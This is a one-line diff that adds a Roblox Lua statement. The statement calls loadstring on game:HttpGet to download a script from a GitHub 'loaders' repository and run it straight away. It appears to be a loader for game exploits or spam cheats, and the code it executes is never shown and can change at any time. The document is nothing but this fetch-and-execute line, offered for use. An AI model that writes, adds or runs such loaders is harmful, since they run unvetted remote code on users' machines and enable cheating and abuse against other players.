@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/squid-game-x-spam3-eruc4ummmaih4i.lua"))()
